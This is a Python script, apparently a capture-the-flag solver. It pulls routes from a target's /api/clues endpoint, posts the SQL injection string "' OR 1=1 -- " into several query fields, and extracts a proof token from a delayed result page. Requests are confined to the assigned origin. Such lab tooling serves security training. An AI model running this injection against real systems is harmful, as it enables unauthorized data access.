#!/usr/bin/env python3
"""Submit a delayed query to an assigned web target and read its result."""

from __future__ import annotations

import argparse
from datetime import datetime, timezone
import hashlib
import json
from pathlib import Path
import re
import sys
from urllib.error import HTTPError, URLError
from urllib.parse import urljoin, urlsplit
from urllib.request import Request, urlopen

from inspect_target import normalize_url, origin


PROOF_RE = re.compile(r"\bproof_[A-Za-z0-9_-]{12,}\b")
MAX_BODY_BYTES = 2 * 1024 * 1024
INJECTION = "' OR 1=1 -- "
QUERY_FIELDS = ("question", "search", "filter", "term", "query")


def request(
    url: str,
    allowed_origin: tuple[str, str, int],
    *,
    method: str = "GET",
    body: bytes | None = None,
) -> tuple[int, bytes]:
    normalized = normalize_url(url)
    if origin(normalized) != allowed_origin:
        raise ValueError(f"refusing off-origin URL: {normalized}")
    headers = {
        "User-Agent": "HuntressCTF-Web-Inspector/1.0",
        "Accept": "*/*",
    }
    if body is not None:
        headers["Content-Type"] = "application/json"
    req = Request(normalized, data=body, headers=headers, method=method)
    try:
        with urlopen(req, timeout=10) as response:
            return response.status, response.read(MAX_BODY_BYTES + 1)
    except HTTPError as exc:
        return exc.code, exc.read(MAX_BODY_BYTES + 1)
    except URLError as exc:
        raise RuntimeError(f"request failed: {exc.reason}") from exc


def save_response(output_dir: Path, name: str, status: int, body: bytes) -> dict[str, object]:
    path = output_dir / name
    path.write_bytes(body)
    return {
        "status": status,
        "file": path.name,
        "bytes": len(body),
        "sha256": hashlib.sha256(body).hexdigest(),
    }


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Follow the assigned delayed-query routes and recover the returned proof."
    )
    parser.add_argument("target", help="absolute target URL from the current attempt")
    parser.add_argument("--output-dir", type=Path, help="directory for response evidence")
    args = parser.parse_args()

    try:
        target = normalize_url(args.target)
        allowed_origin = origin(target)
        host = urlsplit(target).hostname or "target"
        timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
        output_dir = args.output_dir or (
            Path("web-tools/evidence") / f"{host}-delayed-query-{timestamp}"
        )
        output_dir.mkdir(parents=True, exist_ok=True)

        clues_url = normalize_url(urljoin(target, "/api/clues"))
        clues_status, clues_body = request(clues_url, allowed_origin)
        if clues_status != 200:
            raise RuntimeError(f"route inventory returned HTTP {clues_status}")
        clues = json.loads(clues_body.decode("utf-8"))
        if not isinstance(clues, dict):
            raise ValueError("route inventory is not a JSON object")
        feature_route = clues.get("feature_route")
        result_route = clues.get("secondary_route")
        if not all(isinstance(route, str) and route for route in (feature_route, result_route)):
            raise ValueError("route inventory lacks feature_route or secondary_route")

        feature_url = normalize_url(urljoin(target, feature_route))
        result_url = normalize_url(urljoin(target, result_route))
        if origin(feature_url) != allowed_origin or origin(result_url) != allowed_origin:
            raise ValueError("route inventory points outside the assigned target")

        payload = json.dumps(
            {field: INJECTION for field in QUERY_FIELDS},
            separators=(",", ":"),
        ).encode("utf-8")
        feature_status, feature_body = request(
            feature_url, allowed_origin, method="POST", body=payload
        )
        if feature_status < 200 or feature_status >= 300:
            raise RuntimeError(
                f"query submission returned HTTP {feature_status}: "
                f"{feature_body[:500].decode('utf-8', errors='replace')}"
            )

        result_status, result_body = request(result_url, allowed_origin)
        if result_status != 200:
            raise RuntimeError(f"delayed result returned HTTP {result_status}")
        proof_matches = PROOF_RE.findall(result_body.decode("utf-8", errors="replace"))
        if not proof_matches:
            raise RuntimeError(
                "the delayed result contains no proof; inspect its saved response before retrying"
            )

        records = {
            "target": target,
            "created_at": datetime.now(timezone.utc).isoformat(),
            "clues": clues,
            "feature_url": feature_url,
            "result_url": result_url,
            "payload_fields": list(QUERY_FIELDS),
            "payload_value": INJECTION,
            "responses": {
                "clues": save_response(output_dir, "clues.body", clues_status, clues_body),
                "submission": save_response(
                    output_dir, "submission.body", feature_status, feature_body
                ),
                "result": save_response(
                    output_dir, "result.body", result_status, result_body
                ),
            },
            "proof": proof_matches[-1],
        }
        (output_dir / "report.json").write_text(
            json.dumps(records, indent=2, ensure_ascii=False) + "\n",
            encoding="utf-8",
        )
        print(
            json.dumps(
                {
                    "proof": proof_matches[-1],
                    "report": str(output_dir / "report.json"),
                    "result_url": result_url,
                },
                indent=2,
            )
        )
        return 0
    except (
        ValueError,
        RuntimeError,
        OSError,
        UnicodeDecodeError,
        json.JSONDecodeError,
    ) as exc:
        print(json.dumps({"error": str(exc)}), file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())
